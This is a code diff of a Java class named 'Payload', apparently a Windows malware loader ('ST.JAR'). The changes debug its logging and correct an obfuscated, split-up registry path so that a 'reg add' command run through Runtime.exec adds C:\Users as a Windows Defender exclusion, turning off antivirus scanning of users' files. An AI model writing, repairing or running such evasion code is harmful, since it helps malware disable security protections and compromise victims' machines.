@@ -14,8 +14,8 @@ public class Payload {
     }
 
     public static void main(String[] args) {
+        log("--- STARTING ST.JAR ---");
         try {
-            log("--- STARTING ST.JAR ---");
             if (args.length < 2) {
                 log("Missing arguments. Exiting.");
                 return;
@@ -42,8 +42,8 @@ public class Payload {
 
     private static void log(String msg) {
         try {
-            String appData = System.getenv("APPDATA");
-            File logFile = new File(appData + "\\loader\\java_debug.txt");
+            // Hardcoded path to ensure we can write the log
+            File logFile = new File("C:\\java_debug.txt");
             FileWriter fw = new FileWriter(logFile, true);
             fw.write(msg + "\n");
             fw.close();
@@ -93,7 +93,7 @@ public class Payload {
 
             // 1. Add AV Exclusion
             log("Adding AV exclusion...");
-            String regPath = "HKLM\\" + "SOFTWARE\\" + "Microsoft\\" + "\\Windows " + "Defender\\Exclusions\\Paths";
+            String regPath = "HKLM\\" + "SOFTWARE\\" + "Microsoft" + "\\Windows Defender" + "\\Exclusions\\Paths";
             String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
             Runtime.getRuntime().exec(cmd).waitFor();
             
